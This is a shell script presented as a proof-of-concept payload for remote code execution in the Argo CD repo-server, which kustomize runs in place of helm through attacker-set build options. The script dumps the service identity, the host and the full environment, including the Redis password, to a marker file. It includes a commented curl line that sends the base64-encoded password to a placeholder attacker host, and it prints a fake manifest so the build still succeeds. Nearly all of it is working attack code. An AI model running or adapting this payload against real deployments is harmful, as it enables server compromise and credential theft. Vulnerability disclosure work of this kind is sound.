#!/bin/sh
# ---------------------------------------------------------------------------
# PoC payload for Argo CD repo-server RCE via KustomizeOptions.BuildOptions.
#
# kustomize invokes this script INSTEAD of the real `helm` binary because the
# attacker-controlled BuildOptions contained:  --enable-helm --helm-command ./evil.sh
# It is called multiple times with helm-style args (repo add / pull / template).
# We ignore the args, run the payload once, then emit valid YAML on `template`
# so that `kustomize build` still succeeds and the manifest comes back in the
# gRPC response (making the RCE visible on both ends).
# ---------------------------------------------------------------------------

MARKER=/tmp/argocd_pwned.txt

# --- arbitrary code execution as the repo-server service account ---
{
  echo "=== Argo CD repo-server RCE PoC ==="
  echo "date:     $(date)"
  echo "whoami:   $(id)"
  echo "host:     $(hostname)"
  echo "cwd:      $(pwd)"
  echo "argv:     $*"
  echo "--- secondary impact: exfiltrate cache credentials ---"
  echo "REDIS_PASSWORD=${REDIS_PASSWORD}"
  echo "REDIS_SERVER=${REDIS_SERVER}"
  echo "--- full environment ---"
  env
} >> "$MARKER" 2>&1

# Optional out-of-band exfiltration (uncomment + set your listener):
# curl -s "http://ATTACKER_HOST:8000/?rp=$(printf '%s' "$REDIS_PASSWORD" | base64)" >/dev/null 2>&1

# --- keep kustomize happy: on a `template`-style call, print a valid manifest ---
case "$*" in
  *template*)
    cat <<'YAML'
apiVersion: v1
kind: ConfigMap
metadata:
  name: pwned
  namespace: default
data:
  rce: "arbitrary command executed by argocd-repo-server"
YAML
    ;;
  *version*)
    echo 'version.BuildInfo{Version:"v3.99.0"}'
    ;;
  *)
    # repo add / pull / anything else -> succeed silently
    exit 0
    ;;
esac
